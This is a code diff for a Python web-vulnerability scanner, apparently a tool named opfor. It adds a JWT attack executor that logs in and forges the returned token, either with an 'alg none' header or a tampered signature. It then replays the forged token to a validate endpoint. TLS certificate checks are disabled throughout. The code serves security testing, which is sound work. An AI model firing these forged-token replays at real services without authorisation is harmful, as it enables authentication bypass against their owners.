@@ -1,13 +1,16 @@
-"""The active-check executor, a self-built templated scanner.
+"""Active-check executors, a self-built templated scanner.
 
-One executor runs one template (a request plus a matcher) against one target and
-emits a Finding when the matcher fires. Everything that defines an attack lives
-in the template data, the executor is a generic request-and-match engine, no
-external binary. This is our own small nuclei.
+ActiveCheckExecutor runs one request-plus-matcher template. JwtAttackExecutor
+runs a small multi-step flow (login, tamper the token, replay against a validate
+endpoint), because some classes like JWT need more than a single request. Both
+are pure Python, no external tool, and everything that defines an attack lives in
+the template data.
 """
 
 from __future__ import annotations
 
+import base64
+import json
 import re
 import ssl
 import urllib.error
@@ -19,7 +22,6 @@ from opfor.plugins.base import Executor
 
 _TIMEOUT = 12
 _BODY_CAP = 4096
-# Intentionally lax TLS, these are deliberately broken test targets.
 _CTX = ssl.create_default_context()
 _CTX.check_hostname = False
 _CTX.verify_mode = ssl.CERT_NONE
@@ -30,32 +32,37 @@ class _NoRedirect(urllib.request.HTTPRedirectHandler):
         return None
 
 
-def _request(base: str, req: dict) -> dict:
-    """Run the template's request, return raw status/headers/body. Never raises."""
-    url = base.rstrip("/") + req.get("path", "/")
-    method = req.get("method", "GET").upper()
-    data = req["body"].encode() if req.get("body") is not None else None
-    headers = {"User-Agent": "opfor"}
-    if req.get("content_type"):
-        headers["Content-Type"] = req["content_type"]
-    request = urllib.request.Request(url, data=data, headers=headers, method=method)
-    handlers = [urllib.request.HTTPSHandler(context=_CTX)]
-    if req.get("follow_redirects") is False:
-        handlers.insert(0, _NoRedirect)
-    opener = urllib.request.build_opener(*handlers)
+def _do(base, method, path, *, body=None, content_type=None, headers=None, follow_redirects=True) -> dict:
+    """One HTTP request, raw result, never raises."""
+    url = base.rstrip("/") + path
+    h = {"User-Agent": "opfor"}
+    if content_type:
+        h["Content-Type"] = content_type
+    h.update(headers or {})
+    data = body.encode() if isinstance(body, str) else body
+    req = urllib.request.Request(url, data=data, headers=h, method=method)
+    chain = [urllib.request.HTTPSHandler(context=_CTX)]
+    if follow_redirects is False:
+        chain.insert(0, _NoRedirect)
+    opener = urllib.request.build_opener(*chain)
     try:
-        with opener.open(request, timeout=_TIMEOUT) as resp:
-            body = resp.read(_BODY_CAP).decode("utf-8", "replace")
-            return {"url": url, "status": resp.status, "headers": dict(resp.headers.items()), "body": body}
+        with opener.open(req, timeout=_TIMEOUT) as resp:
+            return {"url": url, "status": resp.status, "headers": dict(resp.headers.items()),
+                    "body": resp.read(_BODY_CAP).decode("utf-8", "replace")}
     except urllib.error.HTTPError as exc:
-        body = exc.read(_BODY_CAP).decode("utf-8", "replace")
-        return {"url": url, "status": exc.code, "headers": dict(exc.headers.items()) if exc.headers else {}, "body": body}
+        return {"url": url, "status": exc.code, "headers": dict(exc.headers.items()) if exc.headers else {},
+                "body": exc.read(_BODY_CAP).decode("utf-8", "replace")}
     except urllib.error.URLError as exc:
         return {"url": url, "status": None, "headers": {}, "body": "", "error": str(exc.reason)}
 
 
+def _as_list(v):
+    if v is None:
+        return []
+    return v if isinstance(v, list) else [v]
+
+
 def _matches(match: dict, raw: dict) -> bool:
-    """Apply a data-defined matcher. Every present condition must hold."""
     if raw.get("error"):
         return False
     body = raw.get("body") or ""
@@ -76,45 +83,86 @@ def _matches(match: dict, raw: dict) -> bool:
     return True
 
 
-def _as_list(v):
-    if v is None:
-        return []
-    return v if isinstance(v, list) else [v]
+def _emit(entrypoint_id: str, raw: dict, template: dict) -> list[Fact]:
+    tid = template.get("id", "check")
+    if not _matches(template.get("match", {}), raw):
+        return [Fact(kind="check-clean", about=entrypoint_id, data={"id": tid})]
+    finding = Finding(
+        id=f"finding:{tid}:{urllib.parse.urlsplit(raw.get('url') or '').netloc}",
+        props={
+            "title": template.get("title", tid),
+            "severity": template.get("severity", "info"),
+            "domain": urllib.parse.urlsplit(raw.get("url") or "").netloc,
+            "url": raw.get("url"),
+            "evidence": f"{tid} fired at {raw.get('url')} (status {raw.get('status')})",
+            "status": raw.get("status"),
+            "body_snippet": (raw.get("body") or "")[:240],
+        },
+    )
+    return [Fact(kind="vuln", about=entrypoint_id, data={"id": tid, "severity": template.get("severity")}, yields=(finding,))]
 
 
 class ActiveCheckExecutor(Executor):
     capability = "active_check"
 
     def run(self, task, graph) -> Observation:
-        template = task.params["template"]
-        raw = _request(task.params["base_url"], template.get("request", {}))
-        raw["template"] = template
+        tpl = task.params["template"]
+        r = tpl.get("request", {})
+        raw = _do(
+            task.params["base_url"], r.get("method", "GET").upper(), r.get("path", "/"),
+            body=r.get("body"), content_type=r.get("content_type"),
+            headers=r.get("headers"), follow_redirects=r.get("follow_redirects", True),
+        )
+        raw["template"] = tpl
         return Observation(entrypoint_id=task.id, action="active_check", raw=raw)
 
     def perceive(self, observation) -> list[Fact]:
-        raw = observation.raw
-        template = raw.get("template", {})
-        tid = template.get("id", "check")
-        if not _matches(template.get("match", {}), raw):
-            return [Fact(kind="check-clean", about=observation.entrypoint_id, data={"id": tid})]
-        finding = Finding(
-            id=f"finding:{tid}:{raw.get('url')}",
-            props={
-                "title": template.get("title", tid),
-                "severity": template.get("severity", "info"),
-                "domain": _host(raw.get("url")),
-                "url": raw.get("url"),
-                "evidence": f"{tid} fired at {raw.get('url')} (status {raw.get('status')})",
-                "status": raw.get("status"),
-                "body_snippet": (raw.get("body") or "")[:240],
-            },
-        )
-        return [Fact(kind="vuln", about=observation.entrypoint_id, data={"id": tid, "severity": template.get("severity")}, yields=(finding,))]
+        return _emit(observation.entrypoint_id, observation.raw, observation.raw.get("template", {}))
 
 
-def _host(url: str | None) -> str:
-    return urllib.parse.urlsplit(url or "").netloc
+def _b64url(data: bytes) -> str:
+    return base64.urlsafe_b64encode(data).decode().rstrip("=")
+
+
+def _tamper(token: str, mode: str) -> str:
+    parts = token.split(".")
+    if mode == "alg_none":
+        header = _b64url(b'{"typ":"JWT","alg":"none"}')
+        return f"{header}.{parts[1]}." if len(parts) >= 2 else token
+    # default: tamper_signature, flip the last few chars so the signature is wrong
+    if len(parts) >= 3 and parts[2]:
+        sig = parts[2]
+        flipped = sig[:-3] + ("aaa" if not sig.endswith("aaa") else "bbb")
+        return f"{parts[0]}.{parts[1]}.{flipped}"
+    return token
+
+
+class JwtAttackExecutor(Executor):
+    capability = "jwt_attack"
+
+    def run(self, task, graph) -> Observation:
+        tpl = task.params["template"]
+        base = task.params["base_url"]
+        login = tpl["login"]
+        lr = _do(base, "POST", login["path"], body=json.dumps(login["body"]), content_type="application/json")
+        token = None
+        try:
+            token = json.loads(lr["body"]).get(login.get("token_field", "token"))
+        except Exception:
+            token = None
+        if not token:
+            token = lr.get("headers", {}).get("Authorization") or lr.get("headers", {}).get("authorization")
+        if not token:
+            raw = {"url": base + tpl["validate"]["path"], "error": "no token from login", "template": tpl, "status": lr["status"]}
+            return Observation(entrypoint_id=task.id, action="jwt_attack", raw=raw)
+        forged = _tamper(token, tpl.get("attack", "tamper_signature"))
+        vr = _do(base, "GET", tpl["validate"]["path"], headers={"Authorization": forged})
+        vr["template"] = tpl
+        return Observation(entrypoint_id=task.id, action="jwt_attack", raw=vr)
+
+    def perceive(self, observation) -> list[Fact]:
+        return _emit(observation.entrypoint_id, observation.raw, observation.raw.get("template", {}))
 
 
 def default_executors() -> dict:
-    return {"active_check": ActiveCheckExecutor()}
+    return {"active_check": ActiveCheckExecutor(), "jwt_attack": JwtAttackExecutor()}
